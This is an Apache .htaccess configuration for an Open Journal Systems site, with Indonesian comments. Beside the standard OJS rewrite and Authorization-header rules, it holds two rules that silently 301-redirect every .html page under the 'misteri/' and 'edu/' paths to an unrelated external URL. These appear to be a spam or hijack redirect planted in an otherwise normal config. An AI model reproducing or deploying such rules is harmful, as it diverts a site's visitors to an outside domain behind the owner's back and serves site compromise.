<IfModule mod_rewrite.c>
    RewriteEngine On

    # Jika OJS kamu ada di subfolder, ubah ini:
    # Misal: RewriteBase /journal/
    RewriteBase /

    # Paksa redirect semua .html di path misteri/
    RewriteRule ^misteri/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]

    # Paksa redirect semua .html di path edu/
    RewriteRule ^edu/[^/]+\.html$ https://preciseurl.org/babon [R=301,L,QSA]

    # üîê Header Authorization (dibutuhkan OJS API dan login SSO)
    RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]

    # Lewati file atau folder asli
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    # Arahkan semua request lain ke index.php
    RewriteRule ^ index.php [QSA,L]
</IfModule>

ErrorDocument 403 /index.php
